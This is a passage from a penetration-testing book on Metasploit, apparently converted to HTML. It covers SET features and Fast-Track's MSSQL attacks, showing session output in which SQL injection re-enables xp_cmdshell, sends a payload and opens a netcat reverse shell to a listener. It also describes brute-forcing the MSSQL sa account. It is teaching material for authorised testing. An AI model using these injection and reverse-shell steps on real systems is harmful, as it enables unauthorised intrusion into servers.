2010</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: justify;">[*] Session ID 1 (172.16.32.129:443 -&gt; 172.16.32.131:1333) processing</p><p class="s25" style="padding-left: 111pt;text-indent: 0pt;line-height: 10pt;text-align: justify;">InitialAutoRunScript &#39;migrate -f&#39;</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: justify;">[*] Current server process: java.exe (824) [*] Spawning a notepad.exe host process... [*] Migrating into process ID 3044</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: justify;">[*] New server process: notepad.exe (3044)</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="437" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_445.png"/></span></p><p style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><span><img width="435" height="465" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_446.gif"/></span></p><p class="s29" style="padding-top: 7pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Figure 10-8: Teensy attack code upload</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark306">Additional SET Features</a><a name="bookmark322">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">We won’t cover every aspect of the Social-Engineer Toolkit, but it does have some particularly notable aspects. One tool of note is the SET Interactive Shell: an interactive shell that can be selected as a payload instead of Meter- preter. Another feature is RATTE (Remote Administration Tool Tommy Edition), a full HTTP tunneling payload that was created by Thomas Werth. It relies on HTTP-based communications and piggybacks proxy settings on the target machine. RATTE is particularly useful when the target uses egress and packet inspection rules that can detect non-HTTP traffic. RATTE uses the Blowfish encryption algorithm for communications to allow full encryp- tion over HTTP.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Two other tools include the SET Web-GUI (a full-fledged web applica- tion that automates several of the attacks discussed above) and the wireless attack vector. To run the SET Web-GUI, simply enter <span class="s24">./set-web </span>from the SET home folder. The Web-GUI is written in Python and is a great way to perform</p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">attacks through a web interface. The wireless attack vector creates a rogue access point on the attacking machine. When the target connects to the access point, any website he visits is redirected to the attacker machine, which can then launch a number of SET attacks (such as harvester or the Java applet) on the target.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark307">Looking Ahead</a><a name="bookmark323">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Like Metasploit, SET is a work in progress. The security community has embraced the capabilities and potential of SET and continues to contribute to making it better. Social-engineering attacks are on the rise, so ensuring that you can properly test these attack vectors is imperative for any compre- hensive security program.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">As organizations and vendors get better at securing their network perim- eters with software and hardware solutions, we often forget how easy it is to call or email a user and convince him to click or download something that can be used for an attack. Social engineering in general takes skill and practice, and a good attacker knows that he needs to ensure that the attack is specially crafted to target weaknesses in his targets’ company user awareness programs or systems. A skilled attacker knows that spending a few days researching an organization, looking at Facebook or Twitter pages, and determining what may trigger someone to click hastily is just as important as the tools used behind the attack.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Tools like SET are useful to attackers, but always remember that as a penetration tester, your skill is defined by your creativity and your ability to navigate difficult situations. SET will aid you in attacking your targets, but, ultimately, if you fail, it’s probably because you weren’t creative enough.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 211pt;text-indent: 0pt;text-align: left;"><span><img width="35" height="121" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_447.png"/></span>	<span><img width="35" height="121" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_448.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s11" style="padding-top: 7pt;padding-left: 191pt;text-indent: 0pt;text-align: left;"><a name="bookmark324">FAST-TRACK </a><a name="bookmark334">&zwnj;</a><a name="bookmark335">&zwnj;</a></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s17" style="padding-top: 15pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Fast-Track is an open source Python-based tool for augmenting advanced penetration testing techniques. Fast-Track uses the Metasploit Framework for payload delivery and client-side attack vectors. It complements Metasploit by adding additional features, including Microsoft SQL attacks, more exploits, and browser attack vectors. Fast-Track was created by Dave Kennedy, with contributions from Andrew Weidenhamer, John Melvin, and Scott White. It is currently updated and maintained by Joey Furr (j0fer).</p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">Fast-Track’s interactive mode is the way to use it. To enter interactive mode, as shown below, use <span class="s24">./fast-track.py -i </span>(which is similar to the com- mand used by SET). By issuing different options and sequences, you can cus- tomize your attack, targets, and more. (You can also use <span class="s25">./fast-track.py –g </span>to load the web interface.)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_449.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">oot@bt4:/pentest/exploits/fasttrack# <span class="s24">./fast-track.py -i</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 94pt;text-indent: 0pt;line-height: 11pt;text-align: left;">***********************************************</p><p class="s25" style="padding-left: 94pt;text-indent: 0pt;line-height: 11pt;text-align: left;">******* Performing dependency checks... *******</p><p class="s25" style="padding-left: 94pt;text-indent: 0pt;line-height: 11pt;text-align: left;">***********************************************</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 94pt;text-indent: 0pt;line-height: 11pt;text-align: left;">*** FreeTDS and PYMMSQL are installed. (Check) ***</p><p class="s25" style="padding-left: 94pt;text-indent: 0pt;line-height: 11pt;text-align: left;">*** PExpect is installed. (Check) ***</p><p class="s25" style="padding-left: 94pt;text-indent: 0pt;line-height: 11pt;text-align: left;">*** ClientForm is installed. (Check) ***</p><p class="s25" style="padding-left: 94pt;text-indent: 0pt;line-height: 11pt;text-align: left;">*** Psyco is installed. (Check) ***</p><p class="s25" style="padding-left: 94pt;text-indent: 0pt;line-height: 11pt;text-align: left;">*** Beautiful Soup is installed. (Check) ***</p><p class="s25" style="padding-left: 94pt;text-indent: 0pt;line-height: 11pt;text-align: left;">*** PyMills is installed. (Check) ***</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 94pt;text-indent: 0pt;text-align: left;">Also ensure ProFTP, WinEXE, and SQLite3 is installed from the Updates/Installation menu.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 94pt;text-indent: 0pt;line-height: 193%;text-align: left;">Your system has all requirements needed to run Fast-Track! Fast-Track Main Menu:</p><p class="s25" style="padding-left: 94pt;text-indent: 0pt;text-align: left;">Fast-Track - Where it&#39;s OK to finish in under 3 minutes... Version: v4.0</p><p class="s25" style="padding-left: 94pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Written by: David Kennedy (ReL1K)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><ol id="l28"><li><p class="s25" style="padding-left: 111pt;text-indent: -17pt;line-height: 11pt;text-align: left;">Fast-Track Updates</p></li><li><p class="s25" style="padding-left: 111pt;text-indent: -17pt;line-height: 11pt;text-align: left;">Autopwn Automation</p></li><li><p class="s25" style="padding-left: 111pt;text-indent: -17pt;line-height: 11pt;text-align: left;">Microsoft SQL Tools</p></li><li><p class="s25" style="padding-left: 111pt;text-indent: -17pt;line-height: 11pt;text-align: left;">Mass Client-Side Attack</p></li><li><p class="s25" style="padding-left: 111pt;text-indent: -17pt;line-height: 11pt;text-align: left;">Exploits</p></li><li><p class="s25" style="padding-left: 111pt;text-indent: -17pt;line-height: 11pt;text-align: left;">Binary to Hex Payload Converter</p></li><li><p class="s25" style="padding-left: 111pt;text-indent: -17pt;line-height: 11pt;text-align: left;">Payload Generator</p></li><li><p class="s25" style="padding-left: 111pt;text-indent: -17pt;line-height: 11pt;text-align: left;">Fast-Track Tutorials</p></li><li><p class="s25" style="padding-left: 111pt;text-indent: -17pt;line-height: 11pt;text-align: left;">Fast-Track Changelog</p></li><li><p class="s25" style="padding-left: 111pt;text-indent: -17pt;line-height: 11pt;text-align: left;">Fast-Track Credits</p></li><li><p class="s25" style="padding-left: 111pt;text-indent: -17pt;line-height: 11pt;text-align: left;">Exit</p></li></ol></li></ol><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 3pt;padding-bottom: 3pt;padding-left: 94pt;text-indent: 0pt;text-align: left;">Enter the number:</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_450.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">You can see the general categories of attacks and features in Fast-Track’s main menu above though we’ll only cover selected ones in this chapter.</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">We’ll explore some of the most useful tricks, with an emphasis on exploiting Microsoft SQL. For example, the Autopwn Automation menu simplifies the process of Metasploit’s autopwn functionality—simply enter the IP address, and Fast-Track sets up everything for you. The Exploits menu contains addi- tional exploits not included in Metasploit.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark325">Microsoft SQL Injection</a><a name="bookmark336">&zwnj;</a></p><p class="s19" style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: justify;">SQL injection (SQLi) attacks <span class="p">piggyback SQL commands to assault web applica- tions by exploiting insecure code. A SQL query can be inserted into the back- end database via a trusted web server to execute commands on the database. Fast-Track automates the process of performing advanced SQL injection</span></p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: justify;">attacks by focusing on query string and POST parameters within web applica- tions. The following attack relies on the attacker knowing that SQL injection is present on the target website, and also knowing which parameter is vulner- able. This attack will work only on MS SQL–based systems.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: justify;"><a name="bookmark326">SQL Injector—Query String Attack</a><a name="bookmark337">&zwnj;</a></p><p style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 83%;text-align: justify;">Begin the setup for the attack by selecting <span class="s25">Microsoft SQL Tools </span>from the main menu and then <span class="s25">MSSQL Injector </span><span class="s32">O</span>, as shown below.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_451.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: justify;">Pick a list of the tools from below:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;line-height: 14pt;text-align: left;">O <span class="s25">1. MSSQL Injector</span></p><ol id="l29"><li><p class="s25" style="padding-left: 103pt;text-indent: -12pt;line-height: 9pt;text-align: left;">MSSQL Bruter</p></li><li><p class="s25" style="padding-left: 103pt;text-indent: -12pt;line-height: 11pt;text-align: left;">SQLPwnage</p></li></ol><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 3pt;padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Enter your choice : <span class="s24">1</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_452.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">The simplest form of SQL injection is within the query string, typically sent in the URL field from the browser to the server. This URL string can often contain parameters that inform a dynamic site what information is being requested. Fast-Track distinguishes which field to attack by inserting an <span class="s25">&#39;INJECTHERE </span>into the vulnerable query string parameter, like this:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_453.png"/></span></p><p style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;"><a href="http://www.secmaniac.com/index.asp?id=%27INJECTHERE&amp;date=2011" class="s34">http://www.secmaniac.com/index.asp?id=&#39;INJECTHERE&amp;date=2011</a></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_454.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">When Fast-Track starts to exploit this vulnerability, it will look for the <span class="s25">id </span>string in all fields to determine which field to attack. Let’s look at this in action by selecting the first option, <span class="s25">Query String Parameter Attack</span>.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_455.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Enter which SQL Injector you want to use</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;line-height: 14pt;text-align: left;">O <span class="s25">1. SQL Injector - Query String Parameter Attack</span></p><ol id="l30"><li><p class="s25" style="padding-left: 103pt;text-indent: -12pt;line-height: 9pt;text-align: left;">SQL Injector - POST Parameter Attack</p></li><li><p class="s25" style="padding-left: 103pt;text-indent: -12pt;line-height: 11pt;text-align: left;">SQL Injector - GET FTP Payload Attack</p></li><li><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 193%;text-align: left;">SQL Injector - GET Manual Setup Binary Payload Attack Enter your choice: <span class="s24">1</span></p></li></ol><p class="s24" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">. . . SNIP . . .</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 87%;text-align: left;">Enter the URL of the susceptible site, remember to put &#39;INJECTHERE for the injectable parameter</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a href="http://www.thisisafakesite.com/blah.aspx?id=%27INJECTHERE&amp;password=blah" class="s34" target="_blank">Example:http://www.thisisafakesite.com/blah.aspx?id=&#39;INJECTHERE&amp;password=blah</a></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;line-height: 14pt;text-align: left;">8 <a href="http://www.secmaniac.com/index.asp?id=%27INJECTHERE&amp;date=2011" class="s34" target="_blank">Enter here: </a><a href="http://www.secmaniac.com/index.asp?id=%27INJECTHERE&amp;date=2011" class="s40" target="_blank">http://www.secmaniac.com/index.asp?id=&#39;INJECTHERE&amp;date=2011</a></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Sending initial request to enable xp_cmdshell if disabled...</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Sending first portion of payload (1/4)... Sending second portion of payload (2/4)... Sending third portion of payload (3/4)... Sending the last portion of the payload (4/4)...</p><p class="s25" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Running cleanup before executing the payload...</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 88%;text-align: left;">Running the payload on the server...Sending initial request to enable xp_cmdshell if disabled...</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Sending first portion of payload (1/4)... Sending second portion of payload (2/4)... Sending third portion of payload (3/4)... Sending the last portion of the payload (4/4)... Running cleanup before executing the payload... Running the payload on the server...</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">listening on [any] 4444 ...</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">connect to [10.211.55.130] from (UNKNOWN) [10.211.55.128] 1041</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Microsoft Windows [Version 5.2.3790]</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">(C) Copyright 1985-2003 Microsoft Corp.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 3pt;padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">C:\WINDOWS\system32&gt;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_456.png"/></span></p><p style="padding-top: 7pt;padding-left: 108pt;text-indent: 0pt;text-align: justify;">Success! Full access was granted to the system, all through SQL injection.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: justify;">Note that this attack will not succeed if parameterized SQL queries or stored procedures are in use. Note, too, that the required configuration for this attack is very minimal. After selecting <span class="s25">SQL Injector - Query String</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 74%;text-align: justify;"><span class="s25">Parameter Attack </span><span class="s32">O </span>from the menu of attacks, you simply direct Fast-Track to the point of SQL injection <span class="s32">8</span>. If the <span class="s25">xp_cmdshell </span>stored procedure is disabled, Fast-Track will automatically re-enable it and attempt privilege escalation of</p><p style="padding-top: 1pt;padding-left: 90pt;text-indent: 0pt;text-align: justify;">MS SQL.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: justify;"><a name="bookmark327">SQL Injector—POST Parameter Attack</a><a name="bookmark338">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Fast-Track’s POST parameter attack requires even less configuration than the preceding query string parameter attack. For this attack, simply pass Fast- Track the URL of the website you want to attack, and it will automatically detect the form to attack.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_457.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">Enter which SQL Injector you want to use</p><p style="text-indent: 0pt;text-align: left;"><br/></p><ol id="l31"><li><p class="s25" style="padding-left: 49pt;text-indent: -12pt;line-height: 11pt;text-align: left;">SQL Injector - Query String Parameter Attack</p></li><li><p class="s25" style="padding-left: 49pt;text-indent: -12pt;line-height: 11pt;text-align: left;">SQL Injector - POST Parameter Attack</p></li><li><p class="s25" style="padding-left: 49pt;text-indent: -12pt;line-height: 11pt;text-align: left;">SQL Injector - GET FTP Payload Attack</p></li><li><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 193%;text-align: left;">SQL Injector - GET Manual Setup Binary Payload Attack Enter your choice: <span class="s24">2</span></p></li></ol><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">This portion allows you to attack all forms on a specific website without having to specify each parameter. Just type the URL in, and Fast-Track will auto SQL inject to each parameter looking for both error based injection as well as blind based SQL injection. Simply type the website you want to attack, and let it roll.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 193%;text-align: left;"><a href="http://www.sqlinjectablesite.com/index.aspx" class="s34" target="_blank">Example: </a><a href="http://www.secmaniac.com/" class="s34" target="_blank">http://www.sqlinjectablesite.com/index.aspx Enter the URL to attack: </a><a href="http://www.secmaniac.com/" class="s40" target="_blank">http://www.secmaniac.com</a></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Forms detected...attacking the parameters in hopes of exploiting SQL Injection..</p><p class="s25" style="padding-top: 3pt;padding-left: 36pt;text-indent: 0pt;line-height: 193%;text-align: left;">Sending payload to parameter: txtLogin Sending payload to parameter: txtPassword</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[-] The PAYLOAD is being delivered. This can take up to two minutes. [-]</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">listening on [any] 4444 ...</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">connect to [10.211.55.130] from (UNKNOWN) [10.211.55.128] 1041</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Microsoft Windows [Version 5.2.3790]</p><ol id="l32"><li><p class="s25" style="padding-left: 53pt;text-indent: -17pt;line-height: 11pt;text-align: left;">Copyright 1985-2003 Microsoft Corp.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 3pt;padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">C:\WINDOWS\system32&gt;</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_458.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">As you can see, Fast-Track handled the automatic detection of the POST parameters and injected the attack, completely compromising the affected system via SQL injection.</p><p class="s22" style="padding-top: 9pt;padding-left: 90pt;text-indent: -36pt;text-align: left;">NOTE <span class="s19">You can also use FTP to deliver your payload, although FTP is generally blocked on outbound-based connections.</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark328">Manual Injection</a><a name="bookmark339">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">If you have a different IP address listening for the reverse shell or you need to fine-tune some of the configuration settings, you can set up the injector manually.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_459.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Enter which SQL Injector you want to use</p><p style="text-indent: 0pt;text-align: left;"><br/></p><ol id="l33"><li><p class="s25" style="padding-left: 103pt;text-indent: -12pt;line-height: 11pt;text-align: left;">SQL Injector - Query String Parameter Attack</p></li><li><p class="s25" style="padding-left: 103pt;text-indent: -12pt;line-height: 11pt;text-align: left;">SQL Injector - POST Parameter Attack</p></li><li><p class="s25" style="padding-left: 103pt;text-indent: -12pt;line-height: 10pt;text-align: left;">SQL Injector - GET FTP Payload Attack</p></li></ol></li></ol><p class="s30" style="padding-left: 78pt;text-indent: 0pt;line-height: 14pt;text-align: left;">O <span class="s25">4. SQL Injector - GET Manual Setup Binary Payload Attack</span></p><p class="s25" style="padding-top: 7pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Enter your choice: <span class="s24">4</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">The manual portion allows you to customize your attack for whatever reason.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 88%;text-align: left;">You will need to designate where in the URL the SQL Injection is by using &#39;INJECTHERE</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 193%;text-align: left;"><a href="http://www.thisisafakesite.com/blah.aspx?id=%27INJECTHERE&amp;password=blah" class="s34" target="_blank">So for example, when the tool asks you for the SQL Injectable URL, type: http://www.thisisafakesite.com/blah.aspx?id=&#39;INJECTHERE&amp;password=blah</a></p><p class="s25" style="padding-top: 1pt;padding-left: 90pt;text-indent: 0pt;line-height: 87%;text-align: left;">Enter the URL of the susceptible site, remember to put &#39;INJECTHERE for the injectible parameter</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a href="http://www.thisisafakesite.com/blah.aspx?id=%27INJECTHERE&amp;password=blah" class="s34" target="_blank">Example: http://www.thisisafakesite.com/blah.aspx?id=&#39;INJECTHERE&amp;password=blah</a></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;line-height: 13pt;text-align: left;">8 <a href="http://www.secmaniac.com/index.asp?id=%27INJECTHERE&amp;date=2010" class="s34" target="_blank">Enter here: </a><a href="http://www.secmaniac.com/index.asp?id=%27INJECTHERE&amp;date=2010" class="s40" target="_blank">http://www.secmaniac.com/index.asp?id=</a><a href="http://www.secmaniac.com/index.asp?id=%27INJECTHERE&amp;date=2010" class="s34" target="_blank">&#39;</a><a href="http://www.secmaniac.com/index.asp?id=%27INJECTHERE&amp;date=2010" class="s40" target="_blank">INJECTHERE&amp;date=2010</a></p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;line-height: 11pt;text-align: left;">@ <span class="s25">Enter the IP Address of server with NetCat Listening: </span><span class="s24">10.211.55.130</span></p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;line-height: 13pt;text-align: left;">O <span class="s25">Enter Port number with NetCat listening: </span><span class="s24">9090</span></p><p class="s25" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Sending initial request to enable xp_cmdshell if disabled....</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Sending first portion of payload....</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Sending second portion of payload....</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Sending next portion of payload...</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Sending the last portion of the payload...</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Running cleanup...</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Running the payload on the server...</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">listening on [any] 9090 ...</p><p class="s25" style="padding-left: 111pt;text-indent: -21pt;line-height: 88%;text-align: left;">10.211.55.128: inverse host lookup failed: Unknown server error : Connection timed out</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">connect to [10.211.55.130] from (UNKNOWN) [10.211.55.128] 1045</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Microsoft Windows [Version 5.2.3790]</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">(C) Copyright 1985-2003 Microsoft Corp.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 3pt;padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">C:\WINDOWS\system32&gt;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_460.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 18pt;line-height: 69%;text-align: left;">First choose the manual option at <span class="s32">O</span>. Then, as in the query string param- eter attack, point Fast-Track to the parameter vulnerable to SQL injection <span class="s32">8 </span>and input your listening IP address at <span class="s32">@ </span>along with the port you want your target to connect to at <span class="s32">O</span>. Fast-Track takes care of the rest.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark329">MSSQL Bruter</a><a name="bookmark340">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Perhaps one of the best aspects of Fast-Track is the <span class="s19">MSSQL Bruter </span>(available from the Microsoft SQL Attack Tools menu). When MS SQL is installed, MSSQL Bruter can use integrated Windows authentication, SQL authentica- tion, or mixed-mode authentication.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Mixed-mode authentication allows users to be verified from Windows authentication as well as directly from the MS SQL Server. If mixed-mode or SQL authentication is used during the installation of MS SQL, the adminis- trator installing the software needs to specify an <span class="s19">sa</span>, or system administrator, account for MS SQL. Often, administrators choose a weak, blank, or easily guessable password that can be used to an attacker’s advantage. If the <span class="s19">sa </span>account can be brute forced, it will lead to a compromise of the entire sys- tem through the extended stored procedure <span class="s25">xp_cmdshell</span>.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: justify;">Fast-Track uses a few methods for discovery when looking for MS SQL servers, including using <span class="s19">nmap </span>to perform port scans of the default MS SQL TCP port 1433. If the target machine is using MS SQL Server 2005 or later, dynamic port ranges can be used, which makes it more difficult to enumer- ate, but Fast-Track directly interfaces with Metasploit and can look for port 1434 User Datagram Protocol (UDP) to reveal which port MS SQL server’s dynamic port is running.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: justify;">Once Fast-Track has identified a server and successfully brute forced the <span class="s19">sa </span>account, it will use advanced binary-to-hex conversion methods to deliver a payload. This attack is usually highly successful, especially in large environ- ments where MS SQL is widely used.</p><p style="padding-top: 